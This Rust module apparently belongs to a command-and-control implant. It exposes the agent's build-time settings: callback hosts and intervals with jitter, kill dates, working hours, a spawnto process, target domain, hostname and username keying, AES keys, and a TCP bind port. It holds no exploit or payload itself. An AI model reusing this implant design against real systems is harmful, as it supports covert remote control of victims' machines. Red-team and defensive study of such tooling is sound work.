#![allow(unused)]

mod config_vars {
    include!(concat!(env!("OUT_DIR"), "/config.rs"));
}

pub const fn get_uuid() -> &'static str {
    config_vars::UUID
}

pub const fn get_callback_interval() -> u64 {
    config_vars::CALLBACK_INTERVAL
}

pub const fn get_callback_jitter() -> u32 {
    config_vars::CALLBACK_JITTER
}

pub const fn get_connection_retries() -> u32 {
    config_vars::CONNECTION_RETRIES
}

pub const fn get_working_start() -> u64 {
    config_vars::WORKING_START
}

pub const fn get_working_end() -> u64 {
    config_vars::WORKING_END
}

#[cfg(feature = "domain")]
pub const fn get_domain() -> [u8; 32] {
    config_vars::DOMAIN
}

#[cfg(feature = "hostname")]
pub const fn get_hostname() -> [u8; 32] {
    config_vars::HOSTNAME
}

#[cfg(feature = "username")]
pub const fn get_username() -> [u8; 32] {
    config_vars::USERNAME
}

pub const fn get_spawnto() -> Option<&'static str> {
    return if config_vars::SPAWNTO.len() > 0 {
        Some(config_vars::SPAWNTO)
    } else {
        None
    };
}

pub mod http {
    mod config_vars {
        include!(concat!(env!("OUT_DIR"), "/config.rs"));
    }

    pub const fn get_callback_port() -> u32 {
        config_vars::http::CALLBACK_PORT
    }

    pub const fn get_get_uri() -> &'static str {
        config_vars::http::GET_URI
    }

    pub const fn get_headers() -> &'static [(&'static str, &'static str)] {
        config_vars::http::HEADERS
    }

    pub const fn get_killdate() -> u64 {
        config_vars::http::KILLDATE
    }

    pub const fn get_post_uri() -> &'static str {
        config_vars::http::POST_URI
    }

    pub const fn get_query_path_name() -> &'static str {
        config_vars::http::QUERY_PATH_NAME
    }

    pub const fn get_callback_hosts() -> &'static [&'static str] {
        config_vars::http::CALLBACK_HOSTS
    }

    #[cfg(all(not(feature = "AES"), feature = "EKE"))]
    pub const fn get_aeskey() -> [u8; 32] {
        [0u8; 32]
    }

    #[cfg(feature = "AES")]
    pub const fn get_aeskey() -> [u8; 32] {
        config_vars::http::AESKEY
    }

    pub const fn get_proxy_host() -> &'static str {
        config_vars::http::PROXY_HOST
    }

    pub const fn get_proxy_port() -> u32 {
        config_vars::http::PROXY_PORT
    }
}

pub mod tcp {
    mod config_vars {
        include!(concat!(env!("OUT_DIR"), "/config.rs"));
    }

    pub const fn get_killdate() -> u64 {
        config_vars::tcp::KILLDATE
    }

    #[cfg(all(not(feature = "AES"), feature = "EKE"))]
    pub const fn get_aeskey() -> [u8; 32] {
        [0u8; 32]
    }

    #[cfg(feature = "AES")]
    pub const fn get_aeskey() -> [u8; 32] {
        config_vars::tcp::AESKEY
    }

    pub const fn bind_port() -> u16 {
        config_vars::tcp::PORT
    }
}
